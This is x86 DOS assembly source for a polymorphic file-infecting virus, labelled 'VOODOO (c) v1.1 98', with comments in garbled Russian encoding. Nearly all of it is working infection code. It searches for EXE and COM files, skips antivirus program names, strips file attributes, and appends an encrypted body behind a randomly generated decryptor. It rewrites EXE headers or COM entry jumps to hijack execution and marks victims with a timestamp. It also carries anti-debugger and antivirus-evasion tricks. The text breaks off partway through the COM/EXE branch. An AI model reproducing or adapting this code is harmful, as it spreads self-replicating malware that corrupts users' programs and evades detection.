   Code  segment
         assume cs:code,ds:code,es:code
          org 100h
   ADD_C  EQU 104h    ; ¤«ï  ¤à¥á æ¨¨ ¯¥à¥¬¥ëå
   MorphSize EQU 20   ; ‚¥«¨ç¨  á«ãç ©®£® á¬¥é¥¨ï ¢ ¤¥ªà¨¯â®à¥
   BEGIN_BADY:
   BEGIN : push Bx    ;  ¤«ï  ¤à¥á æ¨¨ ¯¥à¥¬¥ëå
           CALL NEXTPOP
   NEXTPOP: pop  BP
           db  0fch
           JMP START_
   TAG_COM_OR_EXE DB 0    ;IF TAG_COM_OR_EXE=1 then COM else EXE
   ptrs      EQU db 0ebh,0
   hade_exe  EQU 0       ; dw 0           ;signature 1
   partPag   EQU 2       ; dw 0           ;2
   Pagecnt   EQU 4       ; dw 0           ;3
   Relocnt   EQU 6       ; dw 0           ;4
   HdrSize   EQU 8       ; dw 0           ;5
   MinMem    EQU 10      ; dw 0           ;6
   MaxMem    EQU 12      ; dw 0           ;7
   ReloSS    EQU 14      ; dw 0           ;8
   ExeSP     EQU 16      ; dw 0           ;9
   ChkSum    EQU 18      ; dw 0           ;10
   ExeIP     EQU 20      ; dw 0           ;11
   ReloCS    EQU 22      ; dw 0           ;12
   OldDTA    EQU 24      ; size 4b
   CurDTA    EQU 28      ; size 128b
   Count_F   EQU  5      ; —¨á«® ä ©«®¢ ¢ â¥ªãçª¥ §  ®¤¨ ¯à®å®¤
   FileNs    EQU 156     ; size FileCount*16 b   ’ ¡«¨æ  ¨¬¥ ä ©«®¢
   Find_files EQU 156+Count_F*16    ; size 2
   HANDLER    EQU 156+Count_F*16+2  ; size 2
   filesize   EQU HANDLER+2         ; size 4
   Dwr        EQU filesize+4        ; size 4
   fpos       EQU Dwr+4             ; size 4
   oldIP_     EQU Fpos+4            ; size 2
   oldCS_     EQU oldIP_+2          ; size 2
   Hosesize   EQU oldCS_+2          ; size 2
   STUFF_SIZE EQU Hosesize+2        ; size 2
   R          EQU STUFF_SIZE +2     ; SIZE 2
   typeFile   EQU R +2              ; size 1
   CALL_COM   EQU typeFile+1        ; size 3
   old_BX     EQU CALL_COM +3       ; size 2
   New_Bady   EQU  old_BX +2        ; array
   ResPart    EQU  5000
   addres21hTR EQU 7000
   addres24hTR EQU addres21hTR+4
   CurDirRoot EQU  addres24hTR+4
   ;--------------------------------------------------------------------
   path    db '*.exe',0
   RANDOM_SIZE DW 0FFH
   db 'VOODOO (c) v1.1 98'
   ;--------------------------------------------------------------------
   ; ’¥«® ¤¥ªà¨¯â®à 
   STUFF:  ptrs
   s01:    mov bx,ss
           ptrs
   s02:    mov dx,sp
           ptrs
   s03:    mov ax,cs
           ptrs
   s04:    mov ss,ax
           mov sp,0fffeh
           ptrs
   s05:    push bx
           push dx
           ptrs
   s1:     push ds                 ; size 1
           ptrs
   s2:     mov ax,46h              ; size 3
           ptrs
   s3:     mov ds,ax               ; size 2
           ptrs
   s4:     mov word ptr ds:[07],ax ; size 3  â¨‚¥¡ ®¤® ¢à¥¬ï à ¡®â «
           ptrs                    ; ® ã¦¥   „‚¥¡ 4.3 ¥ ¤¥©áâ¢ã¥â
                                   ; å®âï ¡ë¢ ¥â ¨  ª «ë¢ ¥âáï
   s5:     cmp word ptr ds:[07],ax ; size 4
           ptrs
   s6:    je  doprog               ; size 2
          ptrs
   tryagany: in ax,42h             ; size 2   â¨‚¥¡
             ptrs
       s7:   mov si,ax             ; size 2
             ptrs
     s8:     in ax,42h             ; size 2   â¨‚¥¡
             ptrs
     s9:     cmp ax,si             ; size 2
             ptrs
     s10:    jnz tryagany          ; size 2
             je  fuckDrweb         ; size 2
             ptrs
   doprog:   pop ds                ; size 1
             ptrs
   ;-------------------
   randomaze:
      push es
      xor ax,ax
      mov es,ax
      in al,40h
      mov ah,al
      in al,40h
      ;mov ax,word ptr es:[46ch]
      mov word ptr cs:[RandSeed],ax
      mov ax,word ptr es:[46ch+2]
      mov word ptr cs:[RandSeed+2],ax
      pop es
      ret
   ; --------------------
   RandSeed  dd 0000h
   ww        dw 8405h
   ; Random  £¥¥à¨â ç¨á«® ¢ § ¤ ®¬ ¤¨ ¯ §®¥
   random:
   mov ax,WORD PTR cs:[RandSeed ]
   mov bx,WORD PTR cs:[RandSeed+2]
   mov cx,ax
   mul cs:word ptr cs:[ww]
   SHL cx,1
   shl cx,1
   shl cx,1
   add dx,cx
   add dx,bx
   shl bx,1
   shl bx,1
   add dx,bx
   add dh,bl
   mov cl,05
   shl bx,cl
   add ax,0001
   adc dx,0
   mov WORD PTR cs:[RandSeed],ax
   mov WORD PTR cs:[RandSeed+2],dx
   mov bx,sp
   mov cx,dx
   mul ss:word ptr [bx+4]
   mov ax,cx
   mov cx,dx
   mul ss:word ptr [bx+4]
   add ax,cx
   adc dx,00
   mov ax,dx
   retf 0002

   RAND:
   PUSH BX
   push di
   push si
   PUSH AX
   PUSH CS
   CALL RANDOM
   pop si
   pop di
   POP BX
   fuckDrweb: RET
   ;-----------------------------------------
   ;________Procedure find files_________________________
   INCREM equ  4
   SET_ART_SPESH: PUSH DS
                  push es
                  POP DS
                  MOV AX,4301H
                  call int21
                  POP DS
                  RET
   find:
   ;--- Get DTA ----
        push es
        push bx
        mov ah,2fh
        call int21
        mov ax,bx
        mov dx,es
        pop bx
        pop es
        mov es:[oldDTA]  ,ax  ; Save DTA
        mov es:[oldDTA+2],dx  ;
   ;--- Set DTA ----
      push ds
      push es
      pop ds
      mov dx,CurDTA
      call set_DTA
      pop ds
   ;--------------
   ;--Fnd1st------
      PUSH CS
      POP DS
      mov dx,offset path -add_c
      add dx,bp
      mov ah,4eh
      mov cx,0000000000100111b ;atr
      call int21
      jc @error1
       XOR AX,AX
       mov cx,ax
       mov si,ax
      mov di,CurDTA+22
      mov  ah,byte ptr ES:[di]
      and  ah,01fh
      cmp  ah,1ah ;if 52 then ---
      je @next_f
      call Test_Name
      cmp ah,66h
      je  @next_f
   N_Lin: mov di,CurDTA+30
   N_C:   mov dl,byte ptr es:[di]
          cmp dl,0
          je @end_str
          inc si
          inc di
          mov es:[FileNs+si],dl
          jmp N_C
   @end_str:inc si
            inc di
            mov es:[FileNs+si],dl
           push cx
           mov SI,cx
           mov cl,INCREM
           shl SI,cl
           ADD SI,14
           mov di,CurDTA+15H
           MOV DL,BYTE PTR ES:[DI]
           MOV es:[FileNs+si],dl       ;SAVE OLD ART
           ;
           push ds
           push es
           pop ds
           MOV CX,0
           SUB SI,14
           MOV DX,SI
           ADD DX,FileNs+1
           CALL SET_ART_SPESH
           pop ds
           ;
           pop cx
           inc cx
           cmp cx,count_f
           je @to_exit
           push cx
           mov ax,cx
           mov cl,INCREM
           shl ax,cl
           mov si,ax
           pop cx
           jmp @Fndnext
           ;- errors ---
   @error1: mov cx,0 ;--*.exe or *.com in cur dir not exist
   @error2:   ;-- 5 exe in cur dir not exist
   mem_error:  call @to_exit
               ret
   Set_DTA:   mov ah,1ah
              call int21
              ret
   ;----Fnd2stfile-----
   @next_f:  xor cx,cx
             jmp @Fndnext
   @Fndnext2: pop cx
   @Fndnext:
             mov ah,4fh
             call int21
             jc @error2
           ;--if 52 s
           mov di,CurDTA+22
           mov ah,byte ptr es:[di]
           and ah,01fh
           cmp ah,1ah
           je @Fndnext
            push cx
           call Test_Name
           cmp  ah,66h
           je   @Fndnext2
            pop cx
           jmp N_Lin
   @to_exit: push ds
             mov ax,es:[oldDTA+2]
             mov ds,ax
             mov dx,es:[oldDTA]
             call Set_DTA
             POP DS
             ret
   Test_Name: push si               ;â¥áâ     win?????.???
              push di               ;          aid?????.???
              push es               ;          drw?????.???
              push cs               ;          adi?????.???
              pop ds                ;
              call qqqqq            ;
               db 'WINAIDDRWADI'    ;
   qqqqq:     pop si
              xor dx,dx
              dec si
   test_next: mov di,CurDTA+30-1
              mov cx,3
        repp: inc di
              inc si
              mov bl,byte ptr es:[di]
              cmp bl,byte ptr ds:[si]
              jne @lll01
              inc dh
       @lll01:loop repp
               cmp dh,3
               je  stop_
              inc dl
              cmp dl,4
              je ex
              xor dh,dh
              jmp test_next
   stop_:     mov ah,66h
       ex:    pop es
              pop di
              pop si
              ret
   end_find:;
   ;-----------------------------------------
   OPENF:
   ;begin1 open file
   ; AH=3dH
   ; DS:DX fname
   ; AL=open mode 2 R/W
   ; out :
   ; AX=error or handle
    mov AH,3DH
    mov al,2
    call int21
    ;int DOSINT
    jc  error
    mov ch,0
     ret
   error: mov ch,66h
     ret
   ;_______ end of open file ____________________
   closeF:  ;close files
   ; AH=3eH
   ; BX handel
   ; out :
   ; AX=error
    mov AH,3EH
    call int21
   ; int DOSINT
    jc  error1
    mov ch,0
         ret
   error1: mov ch,66h
   next1: ret
   ;---------------------------------------------
   readf: ;bx=handel
          ;CX=number of byte to read
          ;DS:DX BUFFER
           mov ah,3fh
           call int21
           jc  @error
           cmp cx,ax
           jne @error
           mov ch,0
           RET
   @error: mov ch,66h
   @next:  ret
   ;------------ END reading files----------------------
   ;------------------------------------------------
   writef: ;BX=handel
           ;CX=number of byte to read
           ;DS:DX BUFFER
          mov ah,40h
          call int21
          jc  @er
          RET
   @er:   mov ch,66h
   @next_: ret
   ;------------ END Writing files----------------------
   ;----------------------------------------------------
   seekf: ; AL=SUBFUN
          ; BX=handle
          ; CX:DX distance
          ; OUT : DX:AX  distance
          mov ah,42h
          call int21
          jc  @@error
          mov ch,0
           RET
   @@error: mov ch,66h
   @@next:  ret
   ;------------ END seeking files----------------------
   ;________ procedure shr dd___________________________
   ;paramestrs AX=LoDD,DX=HiDD,CX=count bits
   ; reterns   ddWORD(DX,AX)
   shrDD: db 0fh
          db 0adh
          db 0d0h
          shr dx,cl
          ret
   ;________ procedure shl dd___________________________
   ;paramestrs AX=LoDD,DX=HiDD,CX=count bits
   ; reterns   ddWORD(DX,AX)
   shlDD: db 0fh
          db 0a5h
          db 0c2h
          shl ax,cl
          ret
   ;-----------------------------------------
   FileOpen:          ;begin1 open file
                      ; DS:DX fname
                      ; out :
                      ; AX=error or handle
                      push ds
                      push es
                      pop ds
                      mov dx,si
                      mov cl,INCREM
                      shl dx,cl
                      add dx,FileNs+1
                      call OPENF
                      cmp ch,66h
                      je  @_error
                      mov es:[HANDLER],ax ; save
                      ; AL=SUBFUN   seekf
                      ; BX=handle
                      ; DX:CX distance
                      ; OUT : DX:AX  distance
                      xor cx,cx
                      xor dx,dx
                      mov bx,ax
                      mov al,02h
                      call seekf
                      cmp ch,66h
                      je @_error
                     mov es:[filesize+2],dx ;save file size
                     mov es:[filesize],ax   ;
                     STC
                     cmp ax,60000
                     ja @e
                     pop ds
                     ret
                 @e: mov ch,67h
                     pop ds
                     ret
   @_error:          pop ds
                     mov ch,066h
                     ret
   ;----------------------------------------------------
   seekF0:   xor ax,ax ; seek(f,0)
             mov dx,ax
             mov cx,ax
             mov al,0
             mov bx,es:[handleR]
             call seekf
             ret
   ;-----------------------------------------
   read_heder:  ;bx=handel
                ;CX=number of byte to read
                ;DS:DX BUFFER
             push ds
             push es
             pop  ds
             mov bx,es:[handLER]
             mov cx,20h
             xor dx,dx
             call readf
             POP DS
             ret
   ;-------------------------------------------------------
   z          EQU    bp-add_c   ;¤«ï  ¤à¥á æ¨¨ ¯¥à¥¬¥ëå
   nachalo_shiphrovki dw 9090H  ; ¡¥§ ¥®£® Avp ¥®¯®§ ¥â ¥£® ª ª Voodoo.3081 :)
   deshiphr: c000 ptrs                  ; 2            ;1
             c001 ptrs                  ; 2            ;2
             c1  db 0e8h,0,0            ; 12           ;3 \\100 byte
             c1_c ptrs                  ;
             c1_key dw 00               ;
             c1_ret db 0eah             ;
             oldIP__ dw 0               ;
             oldcs__ dw 0               ;
            c01: pop bx                 ;4             ;4 \110
                db 0fch
            c01_c: ptrs                 ;
            c2: push ds                 ;3            ;5 \120
            c2_c  ptrs                  ;
            c3 : push cs                ;3             ;6 \130
            c3_c ptrs                   ;
            c4:pop ds                   ;3             ;7  \140
            c4_c ptrs                   ;
            c5:push es                  ;3             ;8  \150
            c5_c ptrs                   ;             ;9  \160
            c6 :push cs                 ;3             ;10  \170
            c6_c ptrs                   ;
            c7:pop es                   ;3             ;11  \180
            c7_c ptrs                   ;
            c8 db 0b9h                  ;5             ;12  \190
            c8_size dw 0h ;mov_ cx_,size;
            c8_c ptrs                   ;
            c9_: mov si,bx              ;4             ;13  \200
            c9_c_ ptrs                  ;
            c9: add si,0243             ;6              ;14_210
            c9_c: ptrs                  ;
            c10:mov dx,[bx+2]           ;5        load key;15 \220
            c10_c ptrs                  ;
            c11:mov ax,[si]             ;4                    ;16 \230
            c11_c ptrs                  ;
            c12:sub dx,cx               ;4                 ;17  \240
            c12_c ptrs                  ;
            c13: xor ax,dx              ;4                 ;18  \250
            c13_c ptrs                  ;
            c14: mov [si],ax            ;4                   ;19  \260
            c14_c ptrs                  ;
            c15:  inc si                ;4                    ;20  \270
                  inc si                ;
            c15_c ptrs                  ;
            c16 :db 0e2h,204            ;4                     ;21 \280
            c16_c ptrs                  ;
            c17: ptrs                                          ;272 bytes
   count00:mov dl,10
   count01:add  dl,al
           sub  dl,byte ptr es:[R]
           ret
   rand_count00:call rand
                call count00
                ret
   trans:  ADD DI,ES:[R]
           ADD DI,ES:[STUFF_SIZE]
           ADD SI,BP
           cld
           rep movsb
           MOV ES:[R],AX
           ret
   ;----------------------------------------------------------

   DO_STUFF: push cs
             pop  ds
           mov ax,30
           call rand
           mov byte ptr cs:[stuff+1+z],al
           ;---------------------
            mov si,offset stuff-add_c
            add si,bp
            mov di,New_Bady
            push di
            push si
            push ax
            ;-----------
            mov cx,300
   DoEEE:   mov ax,0fffeh
            push cx
            call rand
            pop  cx
            stosw
            loop DoEEE
            ;-----------
            pop ax
            pop si
            pop di
            mov cx,2
             cld
            rep movsb
           ;-------------------
           ;  s01
             add di,ax          ; es:di<--ds:si
             mov ax,7+2
             call rand
             mov byte ptr [si+3],al
             mov cx,4
             cld
             rep movsb
           ; s02
             add di,ax          ; es:di<--ds:si
             mov ax,7+2
             call rand
             mov byte ptr [si+3],al
             mov cx,4
             cld
             rep movsb
            ; s03
             add di,ax          ; es:di<--ds:si
             mov ax,7+2
             call rand
             mov byte ptr [si+3],al
             mov cx,4
             cld
             rep movsb
            ; s04
             add di,ax          ; es:di<--ds:si
             mov ax,7+2+MorphSize
             call rand
             mov byte ptr [si+6],al
             mov cx,7
             cld
             rep movsb
            ; s05
             add di,ax          ; es:di<--ds:si
             mov ax,7+2
             call rand
             mov byte ptr [si+3],al
             mov cx,4
             cld
             rep movsb
           ;-----s1------------
             add di,ax
             mov ax,7+2
             call rand
             mov byte ptr [si+2],al
             mov cx,3
             cld
            rep movsb
            ;----s2----------
             add di,ax
             mov ax,20
             call rand
             mov byte ptr [si+4],al
             mov cx,5
             cld
            rep movsb
            ;----s3----------
             add di,ax
             mov ax,20
             call rand
             mov byte ptr [si+3],al
             mov cx,4
             cld
            rep movsb
            ;---s4-------------
             add di,ax
             mov ax,20
             call rand
             mov byte ptr [si+4],al
             mov cx,5
             cld
            rep movsb
            ;---s5--------------
             add di,ax
             mov ax,20
             call rand
             mov byte ptr [si+5],al
             mov cx,6
             cld
            rep movsb
            ;---s6----------------
             add di,ax
     push di      ;for JE
             mov ax,8
             call rand
             mov byte ptr [si+3],al
             mov cx,4
              cld
            rep movsb
            ;-----tryagany---------------
             add di,ax
             push di ;for jz ,jnz
             mov ax,6
             call rand
             mov byte ptr [si+3],al
             mov cx,4
              cld
            rep movsb
             ;----s7----------------
             add di,ax
             mov ax,6+7
             call rand
             mov byte ptr [si+3],al
             mov cx,4
              cld
            rep movsb
             ;-----s8-----------------
             add di,ax
             mov ax,6+7
             call rand
             mov byte ptr [si+3],al
             mov cx,4
              cld
            rep movsb
             ;----s9--------------------
             add di,ax
             mov ax,6+7
             call rand
             mov byte ptr [si+3],al
             mov cx,4
             cld
            rep movsb
            ;-----s10--------------------
             add di,ax
             pop cx
             sub cx,di
             add cl,0ah
             mov byte ptr [si+1],cl
             mov ax,4
             call rand
             mov byte ptr [si+5],al
             mov cx,6
             cld
            rep movsb
            ;--doprog---------------------
             add di,ax
             mov cx,1
              cld
            rep movsb
             ;-----JE--------
             mov cx,di
             pop ax
             push di
             mov di,ax
             sub cx,ax
             sub cl,3
             mov es:[di+1],cl
             pop di
             mov ax,di
             sub ax,New_Bady
             ret
   ;------------------------------------

   make_v_bady:         PUSH CS
                        POP DS
                        PUSH SI
                call DO_STUFF
                mov es:[STUFF_SIZE],ax
           mov cx,136
   @lll:   push cx
           push di
           mov ax,0FFFEh
           call rand
           pop di
           pop cx
           mov es:[di],ax
           inc di
           inc di
           loop @lll
           ;generet key
           mov ax,0ffffh
           call rand
           ; mov [w1],ax
           mov [c1_key+z],ax
           ;------------------------------
           mov si,offset BEGIN_BADY-add_c
           mov cx,offset zad  -add_c
           sub cx,si
           mov di,New_Bady+272
           push cx
           call trans
           ;---------------------------------
           MOV DI,New_Bady+272+9
           add di,es:[stuff_size]
           cmp byte ptr es:[typeFile],33h
           jne @exe_
           MOV byte ptr eS:[di],0 ;com
           jmp @com
    @exe_: MOV byte ptr eS:[di],1 ;exe
    @com:  ;zashiphrovati
           MOV SI,New_Bady+272
           add si,es:[stuff_size]
           pop cx  ;
           shr cx,1
           mov [c8_size+Z],cx
           MOV DX,[c1_key+z]
   @1:     MOV AX,es:[SI]
           SUB DX,CX
           XOR AX,DX
           MOV es:[SI],AX
           INC SI
           INC SI
           LOOP @1 ;
           ;---------------------------------
   ; £¥¥à¨¬ ¤¥ªà¨â®à
           mov byte ptr [c16+1+z],204 ;+R11-R16
           mov WORD PTR es:[R],0
           mov ax,23
           call rand
           mov dl,0
           call count01
           mov byte ptr [c000+1+z],dl
           mov si,offset c000-add_c
           mov di,New_Bady
           mov cx,2
           call trans
           mov ax,61
           call rand
           mov cx,242
           sub cx,ax
           mov byte ptr [c9+2+z],cl ; !@!
           mov dl,25
           call count01
           sub dl,2
           mov byte ptr [c001+1+z],dl
           mov cx,2
           mov si,offset c001 - add_c
           mov di,New_Bady+2
           call trans ; c001 otpr
           ;ƒ â®¢¨¬ C1
           mov ax,6    ;R_c01
           call rand
           mov dl,73
           call count01
           sub dl,5
           mov byte ptr [c1_c+1+z],dl
           mov cx,12
           mov si,offset c1 - add_c
           mov di,New_Bady+2+25
           call trans ; c1 otpr
           mov ax,7       ;R_c2
           call rand_count00
           sub dl,4
           mov byte ptr [c01_c+1+z],dl
           mov cx,4
           mov si,offset c01 - add_c
           mov di,New_Bady+2+25+73
           call trans ;c01 otpr
           mov ax,7  ;R_c3
           call rand_count00
           sub dl,3
           mov byte ptr [c2_c+1+z],dl
           mov cx,3
           mov si,offset c2 - add_c
           mov di,New_Bady+2+25+73+10
           call trans;c2 otpr
           mov ax,7
           call rand_count00;R_c4
           sub dl,3
           mov byte ptr [c3_c+1+z],dl
           mov cx,3
           mov si,offset c3 - add_c
           mov di,New_Bady+2+25+73+10+10
           call trans;c3 otpr
           mov ax,7
           call rand_count00;R_c5
           sub dl,03
           mov byte ptr [c4_c+1+z],dl
           mov cx,3
           mov si,offset c4 - add_c
           mov di,New_Bady+2+25+73+10+10+10
           call trans;c4 otpr
           mov ax,7
           call rand_count00;R_c6
           sub dl,03
           mov byte ptr [c5_c+1+z],dl
           mov cx,3
           mov si,offset c5 - add_c
           mov di,New_Bady+2+25+73+40
           call trans;c5 otpr
           mov ax,7
           call rand_count00;R_c7
           sub dl,03
           mov byte ptr [c6_c+1+z],dl
           mov cx,3
           mov si,offset c6 - add_c
           mov di,New_Bady+2+25+73+50
           call trans;c6 otpr
           mov ax,5
           call rand_count00;R_c8
           sub dl,03
           mov byte ptr [c7_c+1+z],dl
           mov cx,3
           mov si,offset c7 - add_c
           mov di,New_Bady+2+25+73+60
           call trans;c7 otpr
           mov ax,6
           call rand_count00;R_c9_
           sub dl,5 ;size c8
           mov byte ptr [c8_c+1+z],dl
           mov cx,5
           mov si,offset c8 - add_c
           mov di,New_Bady+2+25+73+70
           call trans;c8 otpr
           mov ax,4
           call rand_count00;R_c9
           sub dl,4 ;size c9_
           mov byte ptr [c9_c_+1+z],dl
           mov cx,4
           mov si,offset c9_ - add_c
           mov di,New_Bady+2+25+73+80
           call trans;c9_ otpr
           mov ax,10-5
           call rand_count00   ;R_c10
           sub dl,6 ;size c9   ;
           mov byte ptr [c9_c+1+z],dl
           mov cx,6
           mov si,offset c9 - add_c
           mov di,New_Bady+2+25+73+90
           call trans ;c9  otpr
           mov ax,10-4
           call rand;R_c11
           add byte ptr [c16+1+z],al ;+R11 for loop
           call count00
           sub dl,5 ;size c10   ;
           mov byte ptr [c10_c+1+z],dl
           mov cx,5
           mov si,offset c10 - add_c
           mov di,New_Bady+2+25+73+100
           call trans;c10  otpr
           mov ax,10-4
           call rand_count00;R_c12
           sub dl,4 ;size c11
           mov byte ptr [c11_c+1+z],dl
           mov cx,4 ;size c11
           mov si,offset c11 - add_c
           mov di,New_Bady+2+25+73+110
           call trans;c11  otpr
           mov ax,10-4
           call rand_count00;R_c13
           sub dl,4 ;size c12
           mov byte ptr [c12_c+1+z],dl
           mov cx,4 ;size c12
           mov si,offset c12 - add_c
           mov di,New_Bady+2+25+73+120
           call trans;c12  otpr
           mov ax,10-4
           call rand_count00;R_c14
           sub dl,4 ;size c13
           mov byte ptr [c13_c+1+z],dl
           mov cx,4 ;size c13
           mov si,offset c13 - add_c
           mov di,New_Bady+2+25+73+130
           call trans;c13  otpr
           mov ax,10-4
           call rand_count00;R_c15
           sub dl,4 ;size c14
           mov byte ptr [c14_c+1+z],dl
           mov cx,4 ;size c14
           mov si,offset c14 - add_c
           mov di,New_Bady+2+25+73+140
           call trans ;c14  otpr
           mov ax,10-4
           call rand;R_c16
           sub byte ptr [c16+1+z],al ;-R16 for loop
           call count00
           sub dl,4 ;size c15
           mov byte ptr [c15_c+1+z],dl
           mov cx,4 ;size c15
           mov si,offset c15 - add_c
           mov di,New_Bady+2+25+73+150
           call trans;c15  otpr
           mov ax,0
           call count00
           sub dl,4 ;size c16
           mov byte ptr [c16_c+1+z],dl
           mov cx,4 ;size c16
           mov si,offset c16 - add_c
           mov di,New_Bady+2+25+73+160
           call trans;c16  otpr
           mov WORD ptr ES:[R],0
           mov cx,2 ;size c17
           mov si,offset c17 - add_c
           mov di,New_Bady+2+25+73+170
           call trans;c17  otpr
                       POP SI
                       RET
   ;-------------------------------------------------------
   seekf_fpos:;---- seek(f,fpos) ------------
          ; AL=SUBFUN
          ; BX=handle
          ; CX:DX distance
          ; OUT : DX:AX  distance
          mov Dx,Es:[fpos]     ;
          MOV CX,Es:[fpos+2]
          mov Bx,es:[handlER] ;
          MOV  aL,0
          call seekf
          ret
   ;-----------------------------------------------------
   @ERRORS_Infeckt_exe: CMP CH,66H
                        JNE @Q
                        MOV AX,OFFSET END_Infeckt_exe-ADD_C
                        ADD AX,BP
                        PUSH AX
                        @Q:
                        RET
   ;-------------------------------------------------------
   GetMySize: mov ax,offset zad
              mov cx,offset BEGIN_BADY
              sub ax,cx
              mov es:[Hosesize],ax
              ret
   ;-------------------------------------------------------
   Infeckt_exe:;---- save oldIP,oldCS --------
               mov ax,es:[exeIP]
               mov cs:[oldIP__+z],ax
               mov ax,es:[reloCS]
               mov cs:[oldCS__+z],ax
             ;---- Count chksum   -----------
              mov ax,word ptr es:[filesize]
              mov dx,word ptr es:[filesize+2]
              mov word ptr es:[dwr],ax
              mov word ptr es:[dwr+2],dx
              mov cx,4
              xor bx,bx
              call cs:[shrdd]
              XOR bx,bx
              mov cx,4
              call cs:[shldd]
              mov word ptr es:[filesize],ax
              mov word ptr es:[filesize+2],dx
              mov ax,word ptr es:[dwr]
              mov Dx,word ptr es:[dwr+2]
              sub ax,word ptr eS:[filesize]
              sbb dx,word ptr eS:[filesize+2]
              mov ES:[ExeIP],ax ; new IP to EOF
   ;-------------Count ReloCS------------------
               mov ax,word ptr es:[dwr]
               mov dx,word ptr es:[dwr+2]
               mov cx,4
               xor bx,bx
               call shrdd
               sub ax,Es:[Hdrsize]
               mov Es:[ReloCS],ax       ;
            ;---- Detect my place ----
               call GetMySize
             ;------------------------------------
             push ax
             push dx
             call make_v_bady
             pop dx
             pop ax
            ;---- Count PageCnt -----------------
            add ax,272 ;!!!!size of dezsh !!?!!
            add ax,es:[stuff_size]
            xor bx,bx
            add ax,word ptr es:[dwr]
            adc dx,word ptr es:[dwr+2]
            mov word ptr es:[filesize],ax   ;new file size
            mov word ptr es:[filesize+2],dx ;
            ;-- PageCnt:=(filesie div 512 )+1
            mov cx,9
            xor bx,bx
            call shrdd ;div 512
            add ax,1          ;+1
            mov es:[PageCnt],ax
            ;---- Count partPag ----
            mov ax,word ptr es:[dwr]
            mov dx,word ptr es:[dwr+2]
            mov word ptr es:[fpos],ax
            mov word ptr es:[fpos+2],dx
            mov ax,word ptr es:[filesize]
            mov dx,word ptr es:[filesize+2]
            mov word ptr es:[dwr],ax
            mov word ptr es:[dwr+2],dx
            mov cx,9
            xor bx,bx
            call shrdd
            xor bx,bx
            mov cx,9
            call shldd
            mov word ptr es:[filesize],ax
            mov word ptr es:[filesize+2],dx
            mov ax,word ptr es:[dwr]
            mov dx,word ptr es:[dwr+2]
            sub ax,word ptr es:[filesize]
            sbb dx,word ptr es:[filesize+2]
            mov es:[partPag],ax            ;NEW Heder Ok
   ;---------- Set hose bady ------------
            call seekf_fpos
            CALL @ERRORS_Infeckt_exe
   ;---- write dezsh+bady with jumper ----
           ;BX=handel
           ;CX=number of byte to read
           ;DS:DX BUFFER
           MOV BX,ES:[HANDLER]
           mov cx,offset zad
           mov ax,offset BEGIN_BADY       ;
           sub cx,ax
           add cx,272                     ;size of dezsh
           ADD CX,ES:[STUFF_SIZE]
            PUSH DS
            PUSH ES
            POP DS
            MOV DX,New_Bady
            CALL  writef
   ;----- Write new hade_exe --------
            call seekf0
            MOV BX,ES:[HANDLER]
             mov cx,24
             xor dx,dx
             call writef
             pop ds
   END_Infeckt_exe:
                 ret
   ;-----------------------------------------
   MAKE52s: ;---¯®¬¥âª  52 á
            mov ax,5700h
            mov bx,Es:[handleR]
            CALL INT21
            jc @_errorL
            mov ax,5701h
            and cx,1111111111100000b
            or  cx,0000000000011010b
            CALL INT21
            jc @_errorL
            ret
   @_errorL: MOV CH,66H
            RET
   ;------------------------------------------
   closeFile:mov Bx,Es:[handleR]
             call closef
             ret
   ;-----------------------------------------
   retern_old_atr: push si
                   mov cl,INCREM
                   shl SI,cl
                   ADD SI,14
                   mov cx,es:[FileNs+si]
                   SUB SI,14
                   MOV DX,SI
                   ADD DX,FileNs+1
                   CALL SET_ART_SPESH
                   pop si
                    ret
   GrateJobe:         call find
                      mov es:[Find_files],cx
                      cmp cx,0
                      je EXE_file_not_found
                      xor si,si
   NEX:               call FileOpen
                      cmp ch,66h
                      je  ret_old_atr
                      call seekF0
                      CALL read_heder
                      cmp Es:[hade_exe],05a4dh
                      je exe_file
                      cmp es:[hade_exe],04d5ah    ;************
                      jne Ne_EXE
   exe_file:          push si
                      call Infeckt_exe
                      call make52s
                      call closeFile
                      POP SI
   ret_old_atr:       call retern_old_atr
                      inc si ;á«¥¤ãîé¨©
                      cmp si,Es:[Find_files]
                      JNE NEX
                      jmp EXE_file_not_found
   Ne_EXE: call closeFile
           jmp  ret_old_atr
   COM_file_not_fJ:  jmp COM_file_not_found
   ;----------------------------------------------------
   EXE_file_not_found:
          mov byte ptr cs:[path+z+2],'c'
          mov byte ptr cs:[path+z+3],'o'
          mov byte ptr cs:[path+z+4],'m'
          call find
          mov es:[Find_files],cx
          mov byte ptr cs:[path+z+2],'E'
          mov byte ptr cs:[path+z+3],'X'
          mov byte ptr cs:[path+z+4],'E'
          cmp word ptr es:[Find_files],0000h
          je  COM_file_not_fJ
   DDD :    mov byte ptr es:[typeFile],033h
             xor si,si
   NEXt_COM:  call cs:[FileOpen]  ;
              cmp ch,67h
              je ComG_60K_J
              call cs:[seekF0]    ;
              ;---- Read old commands ---
              ;bx=handel
              ;CX=number of byte to read
              ;DS:DX BUFFER
              mov cx,3
              mov dx,offset old_commands -add_c
              add dx,bp
              call readf
              ;------------------------------------------
              cmp word ptr cs:[old_commands +z],05a4dh
              je exe_file_2_J
              cmp word ptr cs:[old_commands +z],04d5ah
              je exe_file_2_J
              ;------------------------------------------
               call make_v_bady
              ;------------------------------------------
                mov ax,es:[filesize]
                mov dx,es:[filesize+2]
                mov es:[Fpos],ax
                mov es:[Fpos+2],dx
                call seekf_fpos
              ;-------------------------------------------
                 ;es:[Hosesize]
                 ;BX=handel
                 ;CX=number of byte to read
                 ;DS:DX BUFFER
                 call GetMySize
                 mov cx,es:[Hosesize]
                 add cx,272
                 add cx,es:[STUFF_SIZE]
                 push es
                 pop ds
                 mov dx,New_Bady
                 call writef
                 jmp nextP
             ;---------------------------------------------
   ComG_60K_J : jmp  ComG_60K
   exe_file_2_J: jmp exe_file_2
             ;--------------------------------------------
   nextp :    mov byte ptr es:[CALL_COM],0e8h
              mov ax,es:[filesize]
              sub ax,3
              mov es:[CALL_COM+1],ax
             ;---------------------------------------------
                 call seekF0
                 ;BX=handel
                 ;CX=number of byte to read
                 ;DS:DX BUFFER
                 MOV BX,ES:[handleR]
                 mov cx,3
                 push es
                 pop ds
                 mov dx,CALL_COM
                 call writef
             ;---------------------------------------------
       ComG_60K:
   ret_old_atrc: call make52s
                 call closeFile
                 call retern_old_atr
                 inc si
                 cmp si,Es:[Find_files]
                 Jl NEXt_COM_j
                 jmp COM_file_not_found
     NEXt_COM_j  : mov ax,offset NEXt_COM - add_c
                  add ax,bp
                  push ax
                  ret
              ;-----------------------------------------
   exe_file_2:  mov byte ptr es:[typeFile],0h
                call seekF0
                CALL read_heder
